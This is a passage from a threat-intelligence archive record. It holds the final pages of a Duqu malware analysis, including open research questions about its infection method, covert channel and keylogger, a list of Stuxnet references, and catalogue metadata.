others:\n\n • Is there any exploit, especially 0‐day in Duqu?\n\n • How does Duqu infect computers?\n\n • What are the differences in the RPC functions of Duqu and Stuxnet. And between jminet and cmi4432?\n\n • How is the netp191.pnf 0x9200 .zdata section compressed, and what is it’s goal? Is it a copy of the DLL 302 resource itself?\n\n • What is the reason for having the two separate types: jminet and cmi4432?\n\n • What is the exact communication protocol for the covert channel? Where is TLS? What’s inside? When does it generate self‐signed cert? How does it check remote cert?\n\n 45 The content on this page has not been written by Symantec, \n\n\n-----\n\n###### • Is there anything more interesting in the keylogger, any novel method, trick?\n\n • Exactly how is the keylogger controlled? What is saved at starting time, what is saved periodically and how to control the keylogger?\n\n • How exactly the keylogger commands work: quit,v,restart,in,out, etc.\n\n • Where is the initial delay of the kernel driver specified?\n\n • Where is the expiry of the worm specified?\n\n • Exactly what is the goal of the strings of the Config‐3 of the code, how does it relate to the removal of the malware after it’s expiry? How does it identify it’s own files in drivers and inf directories?\n\n## 15.References\n\n###### [EsetMicroscope] Stuxnet Under the Microscope – ESET http://www.eset.com/resources/white‐papers/Stuxnet_Under_the_Microscope.pdf\n\n [Chappell 2010] Chappell, Geoff. The MRXCLS.SYS Malware Loader . October 14. 2010. http://www.geoffchappell.com/viewer.htm?doc=notes/security/stuxnet/ mrxcls.htm.\n\n [SymantecDossier] Symantec, W32.Stuxnet Dossier, v. 1.2 http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepaper s/w32_stuxnet_dossier.pdf\n\n [ThabetMrxCls] MrxCls –Amr Thabet: Stuxnet Loader Driver\n\n [LangnerCSM] Csmonitor, Mark Clayton, Ralph Langner. From the man who discovered Stuxnet, dire warnings one year later http://www.csmonitor.com/USA/2011/0922/From‐ the‐man‐who‐discovered‐Stuxnet‐dire‐warnings‐one‐year‐later/%28page%29/1\n\n 46 The content on this page has not been written by Symantec, \n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/ICS SCADA/Duqu/W32.Duqu v1.2.pdf"
    ],
    "report_names": [
        "W32.Duqu v1.2.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535997,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1319133825,
    "ts_modification_date": 1319133834,
    "files": {
        "pdf": "https://archive.orkl.eu/6efdcc97b339675e1738eaa7b6e71c3195301445.pdf",
        "text": "https://archive.orkl.eu/6efdcc97b339675e1738eaa7b6e71c3195301445.txt",
        "img": "https://archive.orkl.eu/6efdcc97b339675e1738eaa7b6e71c3195301445.jpg"
    }
}